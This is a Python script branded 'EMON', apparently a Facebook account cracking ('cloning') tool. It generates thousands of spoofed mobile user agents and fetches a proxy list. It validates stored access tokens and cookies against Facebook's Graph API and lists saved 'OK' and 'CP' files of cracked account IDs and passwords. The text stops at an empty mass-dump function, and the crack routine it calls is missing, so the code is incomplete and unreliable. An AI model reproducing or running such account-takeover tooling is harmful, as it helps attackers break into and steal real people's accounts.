# -----------------[ EMON]-------------------#
import requests, bs4, json, os, sys, random, datetime, time, re
from concurrent.futures import ThreadPoolExecutor as tred

from time import localtime as lt

# ------------------[ EMON]-------------------#
import os, platform, time, sys

print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update...? ')
time.sleep(5)
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY SCRIPT GIFT GROUP")
time.sleep(2) 
# ------------------[ EMON]-------------------#
# ------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; SM-T560NU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",] 
ua =["Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 13; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 13; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 13; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 13; SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 12; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 12; moto g pure) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 12; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36v",]
ua =["Mozilla/5.0 (Linux; Android 12; moto g stylus 5G (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 12; moto g 5G (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 12; moto g power (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 11; moto g power (2021)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 10; MAR-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 13; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 12; DE2118) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1",]
ua =["Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",]
ua =["Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",]
ua =["Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",]
ua =["Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",]
ua =["Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",]
ua =["Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1",]
ua =["Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15",]
ua =["Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",]
ua =["Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1",]
ua =["Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1",]
ua =["Mozilla/5.0 (iPhone9,3; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",]
ua =["Mozilla/5.0 (iPhone9,4; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",]
ua =["Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3",]
ua =["Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",]
ua =["Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",]
ua =["Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",]
ua =["Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/47.1.79 like Chrome/47.0.2526.80 Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36",]
ua =["Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",]
ua =["Mozilla/5.0 (Linux; Android 9; AFTWMST22 Build/PS7233; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36",]
ua =["Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586",]
ua =["Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 9; AMN-LX9 Build/HUAWEIAMN-LX9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 10; SM-J600FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 12; motorola edge 30 Build/S1RDS32.55-33-4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 10; moto g(8) power lite Build/QODS30.163-3-36; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 13; motorola edge 30 neo Build/T1SSMS33.1-121-4-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 13; SM-A525M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36",]
ua =["Mozilla/5.0 (Linux; Android 10; ELS-NX9 Build/HUAWEIELS-N29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36",]
ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []
try:
    prox = requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
    open('.prox.txt', 'w').write(prox)
except Exception as e:
    pass
prox = open('.prox.txt', 'r').read().splitlines()
for xd in range(10000):
    a = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Nokia'
    e = random.randrange(100, 9999)
    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/535.1'
    uaku = (f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)

    aa = 'Mozilla/5.0 (Linux; Android 10; SM-A750FN)'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    c = ' en-us; GT-'
    d = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(10):
    a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b = random.randrange(100, 9999)
    c = random.randrange(100, 9999)
    d = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    e = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    f = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    g = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    h = random.randrange(1, 9)
    i = '; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j = random.randrange(1, 9)
    k = random.randrange(1, 9)
    l = 'Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak = f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'


def uaku():
    try:
        ua = open('bbnew.txt', 'r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a = requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
        ua = open('bbnew.txt', 'w')
        aa = re.findall('line">(.*?)<', str(a))
        for un in aa:
            ua.write(un + '\n')
        ua = open('bbnew.txt', 'r').read().splitlines()


# ------------[ INDICATION ]---------------#
id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni = [], [], 0, 0, 0, [], [], [], [], [], [], [], []
cokbrut = []
pwpluss, pwnya = [], []

# ------------[ EMON]--------------#

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'  # DEFAULT
m = '\x1b[1;91m'  # RED +
k = '\033[93m'  # KUNING +
h = '\x1b[1;92m'  # HIJAU +
hh = '\033[32m'  # HIJAU -
u = '\033[95m'  # UNGU
kk = '\033[33m'  # KUNING -
b = '\33[1;96m'  # BIRU -
p = '\x1b[0;34m'  # BIRU +
asu = random.choice([m, k, h, u, b])

###----------[ ANSII COLOR STYLE ]---------- ###

Z = "\x1b[0;90m"  # Hitam
M = "\x1b[38;5;196m"  # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m"  # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"  # Ungu
O = "\x1b[0;96m"  # Biru Muda
P = "\x1b[38;5;231m"  # Putih
J = "\x1b[38;5;208m"  # Jingga
A = "\x1b[38;5;248m"  # Abu-Abu

###----------[ RICH COLOR STYLE ]---------- ###

Z2 = "[#000000]"  # Hitam
M2 = "[#FF0000]"  # Merah
H2 = "[#00FF00]"  # Hijau
K2 = "[#FFFF00]"  # Kuning
B2 = "[#00C8FF]"  # Biru
U2 = "[#AF00FF]"  # Ungu
N2 = "[#FF00FF]"  # Pink
O2 = "[#00FFFF]"  # Biru Muda
P2 = "[#FFFFFF]"  # Putih
J2 = "[#FF8F00]"  # Jingga
A2 = "[#AAAAAA]"  # Abu-Abu

# --------------------[ CONVERTER-BULAN ]--------------#

dic = {'1': 'January', '2': 'February', '3': 'March', '4': 'April', '5': 'May', '6': 'June', '7': 'July', '8': 'August',
       '9': 'September', '10': 'October', '11': 'November', '12': 'December'}
dic2 = {'01': 'January', '02': 'February', '03': 'March', '04': 'April', '05': 'May', '06': 'June', '07': 'July',
        '08': 'August', '09': 'September', '10': 'October', '11': 'November', '12': 'December'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
date = str(tgl) + '/' + str(bln) + '/' + str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx - 12
    tag = "PM"
else:
    a = ltx
    tag = "AM"


# ------------------[ MACHINE-SUPPORT ]---------------#

def alvino_xy(u):
    for e in u + "\n": sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)


def clear():
    os.system('clear')


def back():
    login()


def contact():
    #os.system('xdg-open https://www.facebook.com/Anonymousboybd71')
    back()


def linex():
    print('\033[1;37m')


def animation(u):
    for e in u + "\n": sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)


os.system("xdg-open https://www.facebook.com/Anonymousboybd71")
os.system('espeak -a 300 " Your,   Real,  Name,"')
uname = input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  EMON ,    Tools"')
pass


def login():
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0],
                              cookies={'cookie': cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2, sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            print('\033[0;97m=================')
            animation(' [×] NO INTERNET CONNECTION DETECTED')
            exit()
    except IOError:
        login_lagi334()


def login_lagi334():
    try:
        os.system('clear')

        ses = requests.Session()

    except Exception as e:
        os.system("rm -f .token.txt")
        os.system("rm -f .cok.txt")
        os.system("python nono.py")
        exit()


# ------------------[ MENU ]----------------#
# ===©===#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)
            
logo =("""  ___ __  __  ___  _  _   __   ___   ___ 
 | __|  \/  |/ _ \| \| |__\ \ / /_\ |_ _|
 | _|| |\/| | (_) | .` |___\ V / _ \ | | 
 |___|_|  |_|\___/|_|\_|    \_/_/ \_\___|
                                         """)


def menu():
    os.system('clear')
    print(logo)
    print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m " + uname)
    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;92m " + date)
    print('\033[0;97m===============================================')
    print(f"""\033[97;1m[\033[92;1m1\033[97;1m] \033[0;92mFILE CLONING         """)
    print("""\033[97;1m[\033[92;1m2\033[97;1m] \033[0;93mCONTACT WITH ADMIN""")
    print(f"""\033[97;1m[\033[92;1m3\033[97;1m] \033[92;1mCHECK OK IDz   """)
    print("""\033[97;1m[\033[92;1m0\033[97;1m] \033[0;91mEXIT""")
    print('\033[0;97m=================')
    EMON= input('\x1b[1;92m[+] CHOOSE: ')
    if EMON in ['111']:
        login()
        dump_massal()
    elif EMON in ['1']:
        crack_file()
    elif EMON in ['2', '02']:
        os.system('xdg-open https://wa.me/+8801600107886')
        os.system("python nono.py")
    elif EMON in ['3', '03']:
        result()
    elif EMON in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('\033[0;97m=================')
        animation(' [×] DONE EXIT ')
        exit()
    else:
        print('\033[0;97m=================')
        animation(' [×] SELECT CORRECTLY ')
        back()

    # -----------------[ HASIL-CRACK ]-----------------#


def result():
    os.system('clear')
    print(logo)
    print(' \033[97;1m[\033[92;1m1\033[97;1m] CHECK CP IDZ ')
    print(' \033[97;1m[\033[92;1m2\033[97;1m] CHECK OK IDZ ')
    print(' \033[97;1m[\033[92;1m3\033[97;1m] EXIT ')
    print('\033[0;91m==================')
    kz = input(' \033[97;1m[\033[92;1m•\033[97;1m]CHOOSE : ')
    if kz in ['1', '01']:
        try:
            vin = os.listdir('CP')
        except FileNotFoundError:
            print('\033[0;91m==================')
            animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
            time.sleep(3)
            back()
        if len(vin) == 0:
            print('\033[0;91m==================')
            animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO CP RESULTS FOUND ')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:
                    hem = open('CP/' + isi, 'r').readlines()
                except:
                    continue
                cih += 1
                if cih < 10:
                    nom = '' + str(cih)
                    lol.update({str(cih): str(isi)})
                    lol.update({nom: str(isi)})
                    print('\033[0;91m==================')
                    print(' ' + nom + '. ' + isi + '\033[31m ' + str(len(hem)) + ' \033[0m CP ' + x)
                else:
                    lol.update({str(cih): str(isi)})
                    print(' ' + str(cih) + '. ' + isi + '\033[31m ' + str(len(hem)) + ' \033[0m CP ' + x)
            print('\033[0;91m==================')
            geeh = input(' \033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
            print('\033[0;91m==================')
            try:
                geh = lol[geeh]
            except KeyError:
                print('\033[0;91m==================')
                animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OPTION FOUND ')
                exit()
            try:
                lin = open('CP/' + geh, 'r').read().splitlines()
            except:
                print('\033[0;91m==================')
                animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            nocp = 0
            for cpku in range(len(lin)):
                cpkuni = lin[nocp].split('|')
                print(f' \033[97;1m[\033[92;1m•\033[97;1m] CP : \033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')
                nocp += 1
            print('\033[0;91m==================')
            input('\033[97;1m[\033[92;1m•\033[97;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['2', '02']:
        try:
            vin = os.listdir('OK')
        except FileNotFoundError:
            print('\033[0;91m==================')
            animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
            time.sleep(2)
            back()
        if len(vin) == 0:
            print('\033[0;91m==================')
            animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OK RESULTS FOUND ')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:
                    hem = open('OK/' + isi, 'r').readlines()
                except:
                    continue
                cih += 1
                if cih < 100:
                    print('\033[0;91m==================')
                    nom = '' + str(cih)
                    lol.update({str(cih): str(isi)})
                    lol.update({nom: str(isi)})
                    print(' ' + nom + '. ' + isi + '\033[32m ' + str(len(hem)) + ' \033[0m OK ' + x)
                else:
                    lol.update({str(cih): str(isi)})
                    print(' ' + str(cih) + '. ' + isi + '\033[32m ' + str(len(hem)) + ' \033[0m OK ' + x)
            print('\033[0;91m==================')
            geeh = input(' \x1b[1;92m [•] CHOOSE : ')
            print('\033[0;91m==================')
            try:
                geh = lol[geeh]
            except KeyError:
                print('\033[0;91m==================')
                animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OPTION FOUND ')
                exit()
            try:
                lin = open('OK/' + geh, 'r').read().splitlines()
            except:
                print('\033[0;91m==================')
                animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            nocp = 0
            for cpku in range(len(lin)):
                cpkuni = lin[nocp].split('|')
                print(f'\033[97;1m[\033[92;1m•\033[97;1m] OK : \033[32m {cpkuni[0]}|{cpkuni[1]}\033[0m')
                nocp += 1
            print('\033[0;91m==================')
            input('\033[97;1m[\033[92;1m•\033[97;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['0', '00']:
        back()
    else:
        print('\033[0;91m==================')
        animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OPTION FOUND IN MENU')
        exit()


# -------------------[ CRACK-PUBLIK ]----------------#

def dump_massal():
